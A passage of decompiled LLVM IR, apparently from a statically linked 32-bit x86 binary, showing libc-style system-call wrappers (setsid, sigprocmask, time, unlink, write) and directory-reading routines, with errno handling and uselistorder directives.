; uselistorder directives
  uselistorder i32 %v7_8052d6a, { 1, 0, 2 }
  uselistorder i32 %v0_8052d62, { 1, 0 }
  uselistorder label %dec_label_pc_8052d82, { 1, 0 }
}

define i32 @function_8052d88() local_unnamed_addr {
dec_label_pc_8052d88:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052d89 = load i32, i32* @esi, align 4
  store i32 %v0_8052d89, i32* %stack_var_-8, align 4
  %v0_8052da1 = load i32, i32* @ebx, align 4
  %v1_8052da9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8052da1, i32* @ebx, align 4
  store i32 %v1_8052da9, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052da9, -4095
  br i1 %tmp12, label %dec_label_pc_8052dc1, label %dec_label_pc_8052db5

dec_label_pc_8052db5:                             ; preds = %dec_label_pc_8052d88
  %v1_8052db5 = call i32 @function_80530b9(i32 %v0_8052da1)
  %v0_8052dba = load i32, i32* %esi.global-to-local, align 4
  %v1_8052dba = sub i32 0, %v0_8052dba
  %v2_8052dbc = inttoptr i32 %v1_8052db5 to i32*
  store i32 %v1_8052dba, i32* %v2_8052dbc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052dc4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052dc1

dec_label_pc_8052dc1:                             ; preds = %dec_label_pc_8052d88, %dec_label_pc_8052db5
  %v2_8052dc4 = phi i32 [ %v0_8052d89, %dec_label_pc_8052d88 ], [ %v2_8052dc4.pre, %dec_label_pc_8052db5 ]
  %v0_8052dc1 = phi i32 [ %v1_8052da9, %dec_label_pc_8052d88 ], [ -1, %dec_label_pc_8052db5 ]
  store i32 %v2_8052dc4, i32* @esi, align 4
  ret i32 %v0_8052dc1

; uselistorder directives
  uselistorder i32 %v1_8052da9, { 1, 0, 2 }
  uselistorder i32 %v0_8052da1, { 1, 0 }
  uselistorder label %dec_label_pc_8052dc1, { 1, 0 }
}

define i32 @function_8052dc7() local_unnamed_addr {
dec_label_pc_8052dc7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052dc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8052dc7, i32* %stack_var_-4, align 4
  %v1_8052dd0 = call i32 @setsid(i32 %v0_8052dc7)
  store i32 %v1_8052dd0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052dd0, -4095
  br i1 %tmp7, label %dec_label_pc_8052de7, label %dec_label_pc_8052ddb

dec_label_pc_8052ddb:                             ; preds = %dec_label_pc_8052dc7
  %v1_8052ddb = call i32 @function_80530b9(i32 %v0_8052dc7)
  %v0_8052de0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052de0 = sub i32 0, %v0_8052de0
  %v2_8052de2 = inttoptr i32 %v1_8052ddb to i32*
  store i32 %v1_8052de0, i32* %v2_8052de2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052deb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052de7

dec_label_pc_8052de7:                             ; preds = %dec_label_pc_8052dc7, %dec_label_pc_8052ddb
  %v2_8052deb = phi i32 [ %v0_8052dc7, %dec_label_pc_8052dc7 ], [ %v2_8052deb.pre, %dec_label_pc_8052ddb ]
  %v0_8052de7 = phi i32 [ %v1_8052dd0, %dec_label_pc_8052dc7 ], [ -1, %dec_label_pc_8052ddb ]
  store i32 %v2_8052deb, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052de7

; uselistorder directives
  uselistorder i32 %v1_8052dd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052de7, { 1, 0 }
}

define i32 @function_8052ded(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052ded:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8052dee = load i32, i32* @esi, align 4
  %v4_8052df2 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8052df2, i32* @ecx, align 4
  %v2_8052dfe = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8052dfe, label %dec_label_pc_8052e17, label %dec_label_pc_8052e02

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052ded
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8052e17, label %dec_label_pc_8052e07

dec_label_pc_8052e07:                             ; preds = %dec_label_pc_8052e02
  %v1_8052e07 = call i32 @function_80530b9(i32 %v0_8052dee)
  %v1_8052e0c = inttoptr i32 %v1_8052e07 to i32*
  store i32 22, i32* %v1_8052e0c, align 4
  br label %dec_label_pc_8052e3e

dec_label_pc_8052e17:                             ; preds = %dec_label_pc_8052e02, %dec_label_pc_8052ded
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8052e1c = load i32, i32* @ebx, align 4
  %v7_8052e24 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8052e1c, i32* @ebx, align 4
  store i32 %v7_8052e24, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8052e24, -4095
  br i1 %tmp12, label %dec_label_pc_8052e3e, label %dec_label_pc_8052e30

dec_label_pc_8052e30:                             ; preds = %dec_label_pc_8052e17
  %v1_8052e30 = call i32 @function_80530b9(i32 %v0_8052e1c)
  %v0_8052e35 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e35 = sub i32 0, %v0_8052e35
  %v2_8052e37 = inttoptr i32 %v1_8052e30 to i32*
  store i32 %v1_8052e35, i32* %v2_8052e37, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052e3e

dec_label_pc_8052e3e:                             ; preds = %dec_label_pc_8052e30, %dec_label_pc_8052e17, %dec_label_pc_8052e07
  %storemerge = phi i32 [ -1, %dec_label_pc_8052e07 ], [ %v7_8052e24, %dec_label_pc_8052e17 ], [ -1, %dec_label_pc_8052e30 ]
  %v2_8052e3e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052e3e, i32* @edx, align 4
  store i32 %v0_8052dee, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8052e24, { 1, 0, 2 }
  uselistorder i32 %v0_8052e1c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8052e42(i32* %arg1) local_unnamed_addr {
dec_label_pc_8052e42:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052e42 = load i32, i32* @edi, align 4
  store i32 %v0_8052e42, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8052e4a = load i32, i32* @ebx, align 4
  %v2_8052e52 = call i32 @time(i32* %arg1)
  store i32 %v0_8052e4a, i32* @ebx, align 4
  store i32 %v2_8052e52, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_8052e52, -4095
  br i1 %tmp10, label %dec_label_pc_8052e6a, label %dec_label_pc_8052e5e

dec_label_pc_8052e5e:                             ; preds = %dec_label_pc_8052e42
  %v1_8052e5e = call i32 @function_80530b9(i32 %v0_8052e4a)
  %v0_8052e63 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052e63 = sub i32 0, %v0_8052e63
  %v2_8052e65 = inttoptr i32 %v1_8052e5e to i32*
  store i32 %v1_8052e63, i32* %v2_8052e65, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052e6e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052e6a

dec_label_pc_8052e6a:                             ; preds = %dec_label_pc_8052e42, %dec_label_pc_8052e5e
  %v2_8052e6e = phi i32 [ %v0_8052e42, %dec_label_pc_8052e42 ], [ %v2_8052e6e.pre, %dec_label_pc_8052e5e ]
  %v0_8052e6a = phi i32 [ %v2_8052e52, %dec_label_pc_8052e42 ], [ -1, %dec_label_pc_8052e5e ]
  %v2_8052e6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052e6c, i32* @edx, align 4
  store i32 %v2_8052e6e, i32* @edi, align 4
  ret i32 %v0_8052e6a

; uselistorder directives
  uselistorder i32 %v2_8052e52, { 1, 0, 2 }
  uselistorder i32 %v0_8052e4a, { 1, 0 }
  uselistorder label %dec_label_pc_8052e6a, { 1, 0 }
}

define i32 @function_8052e70() local_unnamed_addr {
dec_label_pc_8052e70:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8052e70 = load i32, i32* @edi, align 4
  store i32 %v0_8052e70, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_8052e78 = load i32, i32* @ebx, align 4
  %v1_8052e79 = inttoptr i32 %tmp to i8*
  %v3_8052e80 = call i32 @unlink(i8* %v1_8052e79)
  store i32 %v0_8052e78, i32* @ebx, align 4
  store i32 %v3_8052e80, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052e80, -4095
  br i1 %tmp9, label %dec_label_pc_8052e98, label %dec_label_pc_8052e8c

dec_label_pc_8052e8c:                             ; preds = %dec_label_pc_8052e70
  %v1_8052e8c = call i32 @function_80530b9(i32 %v0_8052e78)
  %v0_8052e91 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052e91 = sub i32 0, %v0_8052e91
  %v2_8052e93 = inttoptr i32 %v1_8052e8c to i32*
  store i32 %v1_8052e91, i32* %v2_8052e93, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052e9c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052e98

dec_label_pc_8052e98:                             ; preds = %dec_label_pc_8052e70, %dec_label_pc_8052e8c
  %v2_8052e9c = phi i32 [ %v0_8052e70, %dec_label_pc_8052e70 ], [ %v2_8052e9c.pre, %dec_label_pc_8052e8c ]
  %v0_8052e98 = phi i32 [ %v3_8052e80, %dec_label_pc_8052e70 ], [ -1, %dec_label_pc_8052e8c ]
  store i32 %v2_8052e9c, i32* @edi, align 4
  ret i32 %v0_8052e98

; uselistorder directives
  uselistorder i32 %v3_8052e80, { 1, 0, 2 }
  uselistorder i32 %v0_8052e78, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052e98, { 1, 0 }
}

define i32 @function_8052e9e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052e9e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052e9e = load i32, i32* @edi, align 4
  store i32 %v0_8052e9e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052eae = load i32, i32* @ebx, align 4
  %v4_8052eb6 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8052eb6, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052eb6, -4095
  br i1 %tmp12, label %dec_label_pc_8052ece, label %dec_label_pc_8052ec2

dec_label_pc_8052ec2:                             ; preds = %dec_label_pc_8052e9e
  %v1_8052ec2 = call i32 @function_80530b9(i32 %v0_8052eae)
  %v0_8052ec7 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052ec7 = sub i32 0, %v0_8052ec7
  %v2_8052ec9 = inttoptr i32 %v1_8052ec2 to i32*
  store i32 %v1_8052ec7, i32* %v2_8052ec9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052ed2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052ece

dec_label_pc_8052ece:                             ; preds = %dec_label_pc_8052e9e, %dec_label_pc_8052ec2
  %v2_8052ed2 = phi i32 [ %v0_8052e9e, %dec_label_pc_8052e9e ], [ %v2_8052ed2.pre, %dec_label_pc_8052ec2 ]
  %v0_8052ece = phi i32 [ %v4_8052eb6, %dec_label_pc_8052e9e ], [ -1, %dec_label_pc_8052ec2 ]
  store i32 %v2_8052ed2, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052ece

; uselistorder directives
  uselistorder i32 %v4_8052eb6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052ece, { 1, 0 }
}

define i32 @function_8052ed4() local_unnamed_addr {
dec_label_pc_8052ed4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_8052ed4 = load i32, i32* @edi, align 4
  %v0_8052ed5 = load i32, i32* @esi, align 4
  %v0_8052ed6 = load i32, i32* @ebx, align 4
  %v12_8052ed7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_8052ede = inttoptr i32 %tmp to i32*
  %v2_8052ede = load i32, i32* %v1_8052ede, align 4
  %v12_8052ede = icmp eq i32 %v2_8052ede, -1
  %v1_8052ee1 = icmp eq i1 %v12_8052ede, false
  br i1 %v1_8052ee1, label %dec_label_pc_8052ef3, label %dec_label_pc_8052ee3

dec_label_pc_8052ee3:                             ; preds = %dec_label_pc_8052ed4
  %v1_8052ee3 = call i32 @function_80530b9(i32 %v0_8052ed6)
  %v1_8052ee8 = inttoptr i32 %v1_8052ee3 to i32*
  store i32 9, i32* %v1_8052ee8, align 4
  br label %dec_label_pc_8052f3d

dec_label_pc_8052ef3:                             ; preds = %dec_label_pc_8052ed4
  %v1_8052ef3 = add i32 %tmp, 24
  store i32 %v12_8052ed7, i32* @esi, align 4
  %v2_8052f02 = call i32 @function_8054a40(i32 %v12_8052ed7, i32 134564413)
  %v1_8052f0a = call i32 @function_8054a3d(i32 %v1_8052ef3)
  store i32 %v1_8052f0a, i32* @eax, align 4
  %v0_8052f0f = load i32, i32* @edi, align 4
  %v1_8052f0f = inttoptr i32 %v0_8052f0f to i32*
  %v2_8052f0f = load i32, i32* %v1_8052f0f, align 4
  store i32 %v2_8052f0f, i32* @ebx, align 4
  store i32 -1, i32* %v1_8052f0f, align 4
  %v2_8052f1c = call i32 @function_8054a40(i32 %v12_8052ed7, i32 1)
  %v0_8052f22 = load i32, i32* @edi, align 4
  %v1_8052f22 = add i32 %v0_8052f22, 12
  %v2_8052f22 = inttoptr i32 %v1_8052f22 to i32*
  %v3_8052f22 = load i32, i32* %v2_8052f22, align 4
  %v1_8052f25 = call i32 @function_80542d9(i32 %v3_8052f22)
  %v0_8052f2a = load i32, i32* @edi, align 4
  %v1_8052f2d = call i32 @function_80542d9(i32 %v0_8052f2a)
  %v0_8052f32 = load i32, i32* @ebx, align 4
  %v1_8052f35 = call i32 @function_8052b81(i32 %v0_8052f32)
  br label %dec_label_pc_8052f3d

dec_label_pc_8052f3d:                             ; preds = %dec_label_pc_8052ee3, %dec_label_pc_8052ef3
  %v0_8052f43 = phi i32 [ -1, %dec_label_pc_8052ee3 ], [ %v1_8052f35, %dec_label_pc_8052ef3 ]
  store i32 %v0_8052ed6, i32* @ebx, align 4
  store i32 %v0_8052ed5, i32* @esi, align 4
  store i32 %v0_8052ed4, i32* @edi, align 4
  ret i32 %v0_8052f43

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052f3d, { 1, 0 }
}

define i32 @function_8052f44(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052f44:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052f44 = load i32, i32* @edi, align 4
  %v0_8052f46 = load i32, i32* @ebx, align 4
  store i32 %v0_8052f46, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8052f55 = inttoptr i32 %arg1 to i8*
  %v3_8052f55 = call i32 @function_8052c92(i8* %v2_8052f55, i32 67584)
  store i32 %v3_8052f55, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f55, i32* @edi, align 4
  %v2_8052f5f = icmp slt i32 %v3_8052f55, 0
  br i1 %v2_8052f5f, label %dec_label_pc_805302c, label %dec_label_pc_8052f67

dec_label_pc_8052f67:                             ; preds = %dec_label_pc_8052f44
  %v0_8052f67 = load i32, i32* @ebx, align 4
  %v2_8052f69 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_8052f69, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f55, i32* %stack_var_-124, align 4
  %v4_8052f6f = call i32 @function_8054e3a(i32 %v3_8052f55, i32 %v2_8052f69, i32 %v0_8052f67, i32 %v0_8052f67)
  store i32 %v4_8052f6f, i32* %eax.global-to-local, align 4
  %v2_8052f77 = icmp slt i32 %v4_8052f6f, 0
  br i1 %v2_8052f77, label %dec_label_pc_8052f8d, label %dec_label_pc_8052f7b

dec_label_pc_8052f7b:                             ; preds = %dec_label_pc_8052f67
  %v0_8052f80 = load i32, i32* @edi, align 4
  store i32 %v0_8052f80, i32* %stack_var_-124, align 4
  %v3_8052f81 = call i32 @function_8052abd(i32 %v0_8052f80, i32 2, i32 1)
  store i32 %v3_8052f81, i32* %eax.global-to-local, align 4
  %v2_8052f89 = icmp slt i32 %v3_8052f81, 0
  %v1_8052f8b = icmp eq i1 %v2_8052f89, false
  br i1 %v1_8052f8b, label %dec_label_pc_8052fa3, label %dec_label_pc_8052f8d

dec_label_pc_8052f8d:                             ; preds = %dec_label_pc_8052f7b, %dec_label_pc_8052f67
  %v0_8052f8d = load i32, i32* %stack_var_-124, align 4
  %v1_8052f8d = call i32 @function_80530b9(i32 %v0_8052f8d)
  store i32 %v1_8052f8d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f8d, i32* @ebx, align 4
  %v1_8052f97 = inttoptr i32 %v1_8052f8d to i32*
  %v2_8052f97 = load i32, i32* %v1_8052f97, align 4
  %v0_8052f99 = load i32, i32* @edi, align 4
  store i32 %v0_8052f99, i32* %stack_var_-124, align 4
  %v1_8052f9a = call i32 @function_8052b81(i32 %v0_8052f99)
  store i32 %v1_8052f9a, i32* %eax.global-to-local, align 4
  %v1_8052f9f = load i32, i32* @ebx, align 4
  %v2_8052f9f = inttoptr i32 %v1_8052f9f to i32*
  store i32 %v2_8052f97, i32* %v2_8052f9f, align 4
  br label %dec_label_pc_8053018

dec_label_pc_8052fa3:                             ; preds = %dec_label_pc_8052f7b
  store i32 48, i32* %stack_var_-124, align 4
  %v1_8052fa8 = call i32 @function_8053514(i32 48)
  store i32 %v1_8052fa8, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fa8, i32* @ebx, align 4
  %v1_8052fb2 = icmp eq i32 %v1_8052fa8, 0
  br i1 %v1_8052fb2, label %dec_label_pc_8053004, label %dec_label_pc_8052fb6

dec_label_pc_8052fb6:                             ; preds = %dec_label_pc_8052fa3
  %v0_8052fb6 = load i32, i32* @edi, align 4
  %v2_8052fb6 = inttoptr i32 %v1_8052fa8 to i32*
  store i32 %v0_8052fb6, i32* %v2_8052fb6, align 4
  %v1_8052fb8 = add i32 %v1_8052fa8, 16
  %v2_8052fb8 = inttoptr i32 %v1_8052fb8 to i32*
  store i32 0, i32* %v2_8052fb8, align 4
  %v1_8052fbf = add i32 %v1_8052fa8, 8
  %v2_8052fbf = inttoptr i32 %v1_8052fbf to i32*
  store i32 0, i32* %v2_8052fbf, align 4
  %v1_8052fc6 = add i32 %v1_8052fa8, 4
  %v2_8052fc6 = inttoptr i32 %v1_8052fc6 to i32*
  store i32 0, i32* %v2_8052fc6, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8052fd1 = load i32, i32* @ebx, align 4
  %v2_8052fd1 = add i32 %v1_8052fd1, 20
  %v3_8052fd1 = inttoptr i32 %v2_8052fd1 to i32*
  store i32 %tmp, i32* %v3_8052fd1, align 4
  %v0_8052fd4 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052fd9 = icmp ugt i32 %v0_8052fd4, 511
  br i1 %v6_8052fd9, label %dec_label_pc_8052fe2, label %dec_label_pc_8052fdb

dec_label_pc_8052fdb:                             ; preds = %dec_label_pc_8052fb6
  %v0_8052fdb = load i32, i32* @ebx, align 4
  %v1_8052fdb = add i32 %v0_8052fdb, 20
  %v2_8052fdb = inttoptr i32 %v1_8052fdb to i32*
  store i32 512, i32* %v2_8052fdb, align 4
  br label %dec_label_pc_8052fe2

dec_label_pc_8052fe2:                             ; preds = %dec_label_pc_8052fb6, %dec_label_pc_8052fdb
  %v0_8052fe4 = load i32, i32* @ebx, align 4
  %v1_8052fe4 = add i32 %v0_8052fe4, 20
  %v2_8052fe4 = inttoptr i32 %v1_8052fe4 to i32*
  %v3_8052fe4 = load i32, i32* %v2_8052fe4, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_8052fe9 = call i32 @function_8053c88(i64 1, i32 %v3_8052fe4)
  store i32 %v3_8052fe9, i32* %eax.global-to-local, align 4
  %v1_8052ff1 = load i32, i32* @ebx, align 4
  %v2_8052ff1 = add i32 %v1_8052ff1, 12
  %v3_8052ff1 = inttoptr i32 %v2_8052ff1 to i32*
  store i32 %v3_8052fe9, i32* %v3_8052ff1, align 4
  %v1_8052ff4 = icmp eq i32 %v3_8052fe9, 0
  %v1_8052ff6 = icmp eq i1 %v1_8052ff4, false
  br i1 %v1_8052ff6, label %dec_label_pc_805301c, label %dec_label_pc_8052ff8

dec_label_pc_8052ff8:                             ; preds = %dec_label_pc_8052fe2
  %v0_8052ffb = load i32, i32* @ebx, align 4
  store i32 %v0_8052ffb, i32* %stack_var_-124, align 4
  %v1_8052ffc = call i32 @function_80542d9(i32 %v0_8052ffb)
  store i32 %v1_8052ffc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053004

dec_label_pc_8053004:                             ; preds = %dec_label_pc_8052fa3, %dec_label_pc_8052ff8
  %v0_8053007 = load i32, i32* @edi, align 4
  store i32 %v0_8053007, i32* %stack_var_-124, align 4
  %v1_8053008 = call i32 @function_8052b81(i32 %v0_8053007)
  store i32 %v1_8053008, i32* %eax.global-to-local, align 4
  %v1_805300d = call i32 @function_80530b9(i32 %v0_8053007)
  store i32 %v1_805300d, i32* %eax.global-to-local, align 4
  %v1_8053012 = inttoptr i32 %v1_805300d to i32*
  store i32 12, i32* %v1_8053012, align 4
  br label %dec_label_pc_8053018

dec_label_pc_8053018:                             ; preds = %dec_label_pc_8052f8d, %dec_label_pc_8053004
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8053029

dec_label_pc_805301c:                             ; preds = %dec_label_pc_8052fe2
  %v0_805301e = load i32, i32* @ebx, align 4
  %v1_805301e = add i32 %v0_805301e, 24
  store i32 %v1_805301e, i32* %eax.global-to-local, align 4
  store i32 %v1_805301e, i32* %stack_var_-124, align 4
  %v1_8053024 = call i32 @function_8054a3d(i32 %v1_805301e)
  store i32 %v1_8053024, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053029

dec_label_pc_8053029:                             ; preds = %dec_label_pc_8053018, %dec_label_pc_805301c
  %v2_8053031.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805302c

dec_label_pc_805302c:                             ; preds = %dec_label_pc_8052f44, %dec_label_pc_8053029
  %v2_8053031 = phi i32 [ %v0_8052f46, %dec_label_pc_8052f44 ], [ %v2_8053031.pre, %dec_label_pc_8053029 ]
  %v0_805302f = load i32, i32* @ebx, align 4
  store i32 %v0_805302f, i32* %eax.global-to-local, align 4
  store i32 %v2_8053031, i32* @ebx, align 4
  store i32 %v0_8052f44, i32* @edi, align 4
  ret i32 %v0_805302f

; uselistorder directives
  uselistorder i32 %v3_8052fe9, { 1, 0, 2 }
  uselistorder i32 %v1_8052fa8, { 2, 3, 5, 4, 1, 0, 6 }
  uselistorder i32 %v1_8052f8d, { 1, 0, 2 }
  uselistorder i32 %v3_8052f55, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_8053c88, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_8052b81, { 11, 10, 9, 22, 21, 18, 17, 20, 16, 19, 15, 14, 13, 12, 4, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805302c, { 1, 0 }
  uselistorder label %dec_label_pc_8053029, { 1, 0 }
  uselistorder label %dec_label_pc_8053018, { 1, 0 }
  uselistorder label %dec_label_pc_8053004, { 1, 0 }
  uselistorder label %dec_label_pc_8052fe2, { 1, 0 }
}

define i32 @function_8053035() local_unnamed_addr {
dec_label_pc_8053035:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053035 = load i32, i32* @esi, align 4
  %v0_8053036 = load i32, i32* @ebx, align 4
  store i32 %v0_8053036, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_805303e = add i32 %tmp, 24
  store i32 %v1_805303e, i32* @ebx, align 4
  %v2_8053047 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053047, i32* @eax, align 4
  %v2_805304c = call i32 @function_8054a40(i32 %v2_8053047, i32 134564413)
  %v0_8053051 = load i32, i32* @ebx, align 4
  %v1_8053054 = call i32 @function_8054a3d(i32 %v0_8053051)
  br label %dec_label_pc_805305c

dec_label_pc_805305c:                             ; preds = %dec_label_pc_8053087, %dec_label_pc_8053035
  %v0_805305c = load i32, i32* @esi, align 4
  %v1_805305c = add i32 %v0_805305c, 8
  %v2_805305c = inttoptr i32 %v1_805305c to i32*
  %v3_805305c = load i32, i32* %v2_805305c, align 4
  %v2_805305f = add i32 %v0_805305c, 4
  %v3_805305f = inttoptr i32 %v2_805305f to i32*
  %v4_805305f = load i32, i32* %v3_805305f, align 4
  %v6_8053062 = icmp ugt i32 %v3_805305c, %v4_805305f
  br i1 %v6_8053062, label %dec_label_pc_8053087, label %dec_label_pc_8053064

dec_label_pc_8053064:                             ; preds = %dec_label_pc_805305c
  %v0_8053064 = load i32, i32* @edx, align 4
  %v1_8053065 = add i32 %v0_805305c, 20
  %v2_8053065 = inttoptr i32 %v1_8053065 to i32*
  %v3_8053065 = load i32, i32* %v2_8053065, align 4
  %v1_8053068 = add i32 %v0_805305c, 12
  %v2_8053068 = inttoptr i32 %v1_8053068 to i32*
  %v3_8053068 = load i32, i32* %v2_8053068, align 4
  %v1_805306b = inttoptr i32 %v0_805305c to i32*
  %v2_805306b = load i32, i32* %v1_805306b, align 4
  %v4_805306d = call i32 @function_8054e82(i32 %v2_805306b, i32 %v3_8053068, i32 %v3_8053065, i32 %v0_8053064)
  %tmp12 = icmp slt i32 %v4_805306d, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_805307d, label %dec_label_pc_8053079

dec_label_pc_8053079:                             ; preds = %dec_label_pc_8053064
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80530a3

dec_label_pc_805307d:                             ; preds = %dec_label_pc_8053064
  %v1_805307d = load i32, i32* @esi, align 4
  %v2_805307d = add i32 %v1_805307d, 8
  %v3_805307d = inttoptr i32 %v2_805307d to i32*
  store i32 %v4_805306d, i32* %v3_805307d, align 4
  %v0_8053080 = load i32, i32* @esi, align 4
  %v1_8053080 = add i32 %v0_8053080, 4
  %v2_8053080 = inttoptr i32 %v1_8053080 to i32*
  store i32 0, i32* %v2_8053080, align 4
  %v0_8053087.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053087

dec_label_pc_8053087:                             ; preds = %dec_label_pc_805305c, %dec_label_pc_805307d
  %v1_8053095 = phi i32 [ %v0_805305c, %dec_label_pc_805305c ], [ %v0_8053087.pre, %dec_label_pc_805307d ]
  %v1_8053087 = add i32 %v1_8053095, 4
  %v2_8053087 = inttoptr i32 %v1_8053087 to i32*
  %v3_8053087 = load i32, i32* %v2_8053087, align 4
  %v2_805308c = add i32 %v1_8053095, 12
  %v3_805308c = inttoptr i32 %v2_805308c to i32*
  %v4_805308c = load i32, i32* %v3_805308c, align 4
  %v5_805308c = add i32 %v4_805308c, %v3_8053087
  store i32 %v5_805308c, i32* @ebx, align 4
  %v1_805308f = add i32 %v5_805308c, 8
  %v2_805308f = inttoptr i32 %v1_805308f to i16*
  %v3_805308f = load i16, i16* %v2_805308f, align 2
  %v4_805308f = zext i16 %v3_805308f to i32
  store i32 %v4_805308f, i32* @edx, align 4
  %v2_8053093 = add i32 %v4_805308f, %v3_8053087
  store i32 %v2_8053093, i32* %v2_8053087, align 4
  %v0_8053098 = load i32, i32* @ebx, align 4
  %v1_8053098 = add i32 %v0_8053098, 4
  %v2_8053098 = inttoptr i32 %v1_8053098 to i32*
  %v3_8053098 = load i32, i32* %v2_8053098, align 4
  %v1_805309b = load i32, i32* @esi, align 4
  %v2_805309b = add i32 %v1_805309b, 16
  %v3_805309b = inttoptr i32 %v2_805309b to i32*
  store i32 %v3_8053098, i32* %v3_805309b, align 4
  %v0_805309e = load i32, i32* @ebx, align 4
  %v1_805309e = inttoptr i32 %v0_805309e to i32*
  %v2_805309e = load i32, i32* %v1_805309e, align 4
